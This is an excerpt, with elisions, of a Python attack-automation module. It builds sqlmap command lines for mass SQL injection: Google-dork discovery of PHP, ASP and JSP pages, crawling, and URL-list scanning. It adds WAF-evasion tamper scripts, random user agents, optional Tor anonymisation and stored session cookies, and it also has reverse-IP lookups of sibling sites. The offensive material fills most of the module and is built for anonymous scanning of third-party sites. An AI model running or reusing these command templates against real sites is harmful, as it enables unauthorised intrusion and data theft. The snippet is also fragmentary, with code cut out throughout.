...
class Xcdn(object):
    ...
    def flush_dns(self):
        ...
        if re.search(r"kali",sysInfo,re.I) and re.search(r"debain",sysInfo,re.I):
...
def post_request(url, data):
    ...
    import chardet
    bytesEncoding=chardet.detect(content)
...
cd phantomjs-2.1.1-linux-i686 && cp bin/phantomjs /usr/bin/")
        ...
        try:
            ...
            result = browser.get(url,timeout=10)
            # print(result.url)
...
择随便扫描,n|N选择认真扫描,默认随便扫描,default[y]")
                ...
                if tmpchoose in ['n','N']:
                    cookie=input("please input your cookie for %s" % target)
                else:
                    cookie=""
...
def bing_search(query, search_type):
    ...
    import chardet
    bytesEncoding=chardet.detect(response_data)
...
def get_ip_domains_list(ip):
    #不再用bing接口查询旁站
    resp=get_request("https://x.threatbook.cn/7e2935f1ac5e47fd8ae79305f36200c8/ipRelatives?ip=%s&domain=fuck.com" % ip)
    html=resp['content']
    import re
...
def sqlmap_g_nohuman(http_url_or_file, tor_or_not, post_or_not):
    ...
    if re.match("(http://)|(https://)", http_url_or_file):
        ...
        sqlmap_string='''/usr/share/sqlmap/sqlmap.py -g "site:%s inurl:php|asp|aspx|jsp" --delay %d --smart --batch -v 4 --threads 4 --random-agent --safe-url "%s" --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3''' % (
            domain_url,delay, http_url_or_file)
        forms_sqlmap_string='''/usr/share/sqlmap/sqlmap.py -g "site:%s inurl:php|asp|aspx|jsp" --delay %d --smart --batch -v 4 --threads 4 --random-agent --safe-url "%s" --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3 --forms''' % (
            domain_url,delay, http_url_or_file)
        tor_sqlmap_string='''/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -g "site:%s inurl:php|asp|aspx|jsp" --delay %d --smart --batch -v 4 --threads 4 --random-agent --safe-url "%s" --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3''' % (
            domain_url,delay, http_url_or_file)
        tor_forms_sqlmap_string='''/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -g "site:%s inurl:php|asp|aspx|jsp" --delay %d --smart --batch -v 4 --threads 4 --random-agent --safe-url "%s" --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3 --forms''' % (
            domain_url,delay, http_url_or_file)
...
def sqlmap_crawl(origin_http_url_or_file, tor_or_not, post_or_not):
    ...
    if re.match("(http://)|(https://)", origin_http_url_or_file):
        ...
        sqlmap_string='''/usr/share/sqlmap/sqlmap.py -u "%s" --crawl=5 --delay %d --smart -v 4 --threads 4 --batch --random-agent --safe-url "%s" --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3''' % (
            origin_http_url,delay, origin_http_url)
        forms_sqlmap_string='''/usr/share/sqlmap/sqlmap.py -u "%s" --crawl=5 --delay %d --smart -v 4 --threads 4 --batch --random-agent --safe-url "%s" --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3 --forms''' % (
            origin_http_url,delay, origin_http_url)
        tor_sqlmap_string='''/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -u "%s" --crawl=5 --delay %d --smart -v 4 --threads 4 --batch --random-agent --safe-url "%s" --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3''' % (
            origin_http_url,delay, origin_http_url)
        tor_forms_sqlmap_string='''/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -u "%s" --crawl=5 --delay %d --smart -v 4 --threads 4 --batch --random-agent --safe-url "%s" --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3 --forms''' % (
            origin_http_url,delay, origin_http_url)
        # print("sqlmap_string is:%s" % sqlmap_string)
        if not tor_or_not:
            print("sqlmap_string is:%s" % sqlmap_string)
...
def sqlmap_g_human(http_url_or_file, tor_or_not, post_or_not):
    ...
    if re.match("(http://)|(https://)", http_url_or_file):
        ...
        sqlmap_string='''/usr/share/sqlmap/sqlmap.py -m GoogleScraper_origin_http_domain_url_list.txt -v 4 --delay %d --smart --batch --threads 4 --random-agent --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3''' % delay
        forms_sqlmap_string='''/usr/share/sqlmap/sqlmap.py -m GoogleScraper_origin_http_domain_url_list.txt -v 4 --delay %d --smart --batch --threads 4 --random-agent --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3 --forms''' % delay
        tor_sqlmap_string='''/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -m GoogleScraper_origin_http_domain_url_list.txt -v 4 --delay %d --smart --batch --threads 4 --random-agent --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3''' % delay
        tor_forms_sqlmap_string='''/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -m GoogleScraper_origin_http_domain_url_list.txt -v 4 --delay %d --smart --batch --threads 4 --random-agent --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3 --forms''' % delay
        # print("sqlmap_string is:%s" % sqlmap_string)
        if not tor_or_not:
            print("sqlmap_string is:%s" % sqlmap_string)
            print("forms_sqlmap_string is:%s" % forms_sqlmap_string)
...
def get_domainUrl_cookie(domainUrl):
    ...
    if re.search(r"\[%s\]" % tmp,content):
        cookie=get_key_value_from_config_file(configIniPath,domainUrl,'cookie')
        return cookie
    else:
        ...
        if find_main_domain:
            ...
            cookie=get_key_value_from_config_file(configIniPath,main_domain_url,'cookie')
            return cookie
    return ""
